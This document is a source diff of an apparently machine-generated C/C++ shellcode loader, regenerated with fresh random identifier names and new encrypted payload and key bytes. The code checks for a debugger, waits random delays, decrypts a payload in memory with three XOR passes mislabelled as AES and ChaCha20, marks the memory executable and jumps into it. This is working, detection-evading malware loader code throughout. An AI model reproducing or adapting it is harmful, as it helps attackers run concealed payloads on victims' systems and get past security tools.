@@ -12,7 +12,7 @@
 #include <cstdlib>
 #endif
 
-bool instUtilxInIEA993() {
+bool instUtildpUCig559() {
 #ifdef _WIN32
     if (IsDebuggerPresent()) return true;
     BOOL debugged = FALSE;
@@ -44,26 +44,26 @@ int main() {
     }
 
     // Anti-debug
-    if (instUtilxInIEA993()) return 0;
+    if (instUtildpUCig559()) return 0;
 
     // Payload data
-    unsigned char sysBaseogkFSL044[] = {
-        0x6b, 0x0b, 0xb5, 0xd6, 0x55, 0x5c, 0x5f, 0xa6, 0xa5, 0x87, 0xfd, 0x6b, 0xaa, 0x98, 0x65, 0x49, 
-        0x78, 0x35, 0x76, 0x06, 0x67, 0x0b, 0x44, 0x48, 0x38, 0x85, 0x02, 0x8c, 0x29, 0xe4, 0x25, 0x8d, 
-        0x30, 0xaf, 0x03, 0xf0, 0x81
+    unsigned char sysBasewAquiB661[] = {
+        0xdd, 0x42, 0x12, 0x67, 0xc7, 0xbe, 0x2f, 0x52, 0xe4, 0xf6, 0x4a, 0xc4, 0x52, 0x03, 0x49, 0x51, 
+        0xef, 0xf6, 0x3c, 0x86, 0x6d, 0x30, 0x64, 0x84, 0x0b, 0x22, 0x63, 0xaf, 0xce, 0xf6, 0x7b, 0xde, 
+        0x67, 0x1c, 0xf2, 0xd9, 0xaf
     };
 
     // Decryption keys
-    unsigned char procHelperHRVdCjuvB463[] = {
-        0x1e, 0x52, 0x45, 0xc4, 0x0d, 0x63, 0x13, 0xb7, 0x55, 0xee, 0xfb, 0x18, 0xc2, 0xa6, 0xab, 0xfc, 
-        0x78
+    unsigned char procHelperHoachEfkM650[] = {
+        0xa8, 0xca, 0x2d, 0x10, 0xe2, 0xa2, 0x8b, 0xdc, 0x61, 0x0a, 0x4d, 0x62, 0x35, 0xcf, 0x5c, 0x83, 
+        0x16
     };
-    unsigned char execServicecsuIUhGyxHr343[] = {
-        0x8d, 0xe3, 0x7c, 0x3a, 0xae, 0x47, 0x7a, 0x0f, 0xf1, 0x0f, 0x5c, 0x85, 0x38, 0x47, 0x5d, 0xd1
+    unsigned char execServiceKgdYGOJfmRu852[] = {
+        0x27, 0xf2, 0x57, 0x7a, 0xfb, 0x39, 0x74, 0x9c, 0xb3, 0x0c, 0x57, 0x6d, 0xd0, 0x2a, 0x70, 0xeb
     };
-    unsigned char runModuleSXrTqoBzK102[] = {
-        0x77, 0x12, 0x20, 0x53, 0x29, 0x96, 0x5b, 0x08, 0x68, 0xed, 0x56, 0x20, 0xa5, 0xea, 0x23, 0xe2, 
-        0x8c, 0x2f, 0xb8, 0x17, 0x7c, 0xab, 0xe7, 0x8a, 0x48, 0x5d, 0xc9, 0xfb, 0x23, 0xc0, 0x78, 0xd9
+    unsigned char runModuleuiBmVKmJm598[] = {
+        0xa9, 0xe4, 0x25, 0xce, 0x3b, 0x81, 0x39, 0xfe, 0xe7, 0xe9, 0x5a, 0x9e, 0xda, 0x48, 0xf2, 0x73, 
+        0x34, 0xc1, 0x5f, 0x44, 0x32, 0xa7, 0xe4, 0xcb, 0xcf, 0x59, 0x69, 0x81, 0x70, 0x43, 0xec, 0xa7
     };
 
     // Random delay before memory allocation
@@ -75,23 +75,23 @@ int main() {
     }
 
     // Allocate executable memory
-    size_t execManagerlOwozcsBDxD788 = sizeof(sysBaseogkFSL044);
+    size_t execManagermjKmKuAmbWM385 = sizeof(sysBasewAquiB661);
 #ifdef _WIN32
-    void* instServicegTmTjAyVnDp718 = VirtualAlloc(0, execManagerlOwozcsBDxD788, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!instServicegTmTjAyVnDp718) return 1;
+    void* instServiceNuvKhTlMxLC515 = VirtualAlloc(0, execManagermjKmKuAmbWM385, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!instServiceNuvKhTlMxLC515) return 1;
 #else
-    void* instServicegTmTjAyVnDp718 = mmap(0, execManagerlOwozcsBDxD788, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if (instServicegTmTjAyVnDp718 == MAP_FAILED) return 1;
+    void* instServiceNuvKhTlMxLC515 = mmap(0, execManagermjKmKuAmbWM385, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (instServiceNuvKhTlMxLC515 == MAP_FAILED) return 1;
 #endif
 
     // Copy payload to allocated memory
-    memcpy(instServicegTmTjAyVnDp718, sysBaseogkFSL044, execManagerlOwozcsBDxD788);
-    unsigned char* valHandlerBYfORntaNx901 = (unsigned char*)instServicegTmTjAyVnDp718;
+    memcpy(instServiceNuvKhTlMxLC515, sysBasewAquiB661, execManagermjKmKuAmbWM385);
+    unsigned char* valHandlervYPivggVHd618 = (unsigned char*)instServiceNuvKhTlMxLC515;
 
     // In-memory decryption
     // Decrypt XOR layer
-    for (size_t i = 0; i < execManagerlOwozcsBDxD788; i++) {
-        valHandlerBYfORntaNx901[i] ^= procHelperHRVdCjuvB463[i % sizeof(procHelperHRVdCjuvB463)];
+    for (size_t i = 0; i < execManagermjKmKuAmbWM385; i++) {
+        valHandlervYPivggVHd618[i] ^= procHelperHoachEfkM650[i % sizeof(procHelperHoachEfkM650)];
     }
 
     // Random micro-delay
@@ -103,8 +103,8 @@ int main() {
     }
 
     // Decrypt AES layer
-    for (size_t i = 0; i < execManagerlOwozcsBDxD788; i++) {
-        valHandlerBYfORntaNx901[i] ^= runModuleSXrTqoBzK102[i % sizeof(runModuleSXrTqoBzK102)];
+    for (size_t i = 0; i < execManagermjKmKuAmbWM385; i++) {
+        valHandlervYPivggVHd618[i] ^= runModuleuiBmVKmJm598[i % sizeof(runModuleuiBmVKmJm598)];
     }
 
     // Random micro-delay
@@ -116,17 +116,17 @@ int main() {
     }
 
     // Decrypt ChaCha20 layer
-    for (size_t i = 0; i < execManagerlOwozcsBDxD788; i++) {
-        valHandlerBYfORntaNx901[i] ^= execServicecsuIUhGyxHr343[i % sizeof(execServicecsuIUhGyxHr343)];
+    for (size_t i = 0; i < execManagermjKmKuAmbWM385; i++) {
+        valHandlervYPivggVHd618[i] ^= execServiceKgdYGOJfmRu852[i % sizeof(execServiceKgdYGOJfmRu852)];
     }
 
     // Make memory executable
 #ifdef _WIN32
-    DWORD methComponentjfzYKBivwECPA954;
-    VirtualProtect(instServicegTmTjAyVnDp718, execManagerlOwozcsBDxD788, PAGE_EXECUTE_READ, &methComponentjfzYKBivwECPA954);
-    FlushInstructionCache(GetCurrentProcess(), instServicegTmTjAyVnDp718, execManagerlOwozcsBDxD788);
+    DWORD methComponenteThmlwHdkCvYF847;
+    VirtualProtect(instServiceNuvKhTlMxLC515, execManagermjKmKuAmbWM385, PAGE_EXECUTE_READ, &methComponenteThmlwHdkCvYF847);
+    FlushInstructionCache(GetCurrentProcess(), instServiceNuvKhTlMxLC515, execManagermjKmKuAmbWM385);
 #else
-    mprotect(instServicegTmTjAyVnDp718, execManagerlOwozcsBDxD788, PROT_READ | PROT_EXEC);
+    mprotect(instServiceNuvKhTlMxLC515, execManagermjKmKuAmbWM385, PROT_READ | PROT_EXEC);
 #endif
 
     // Final random delay before execution
@@ -138,7 +138,7 @@ int main() {
     }
 
     // Execute payload
-    ((void(*)())instServicegTmTjAyVnDp718)();
+    ((void(*)())instServiceNuvKhTlMxLC515)();
 
     return 0;
 }
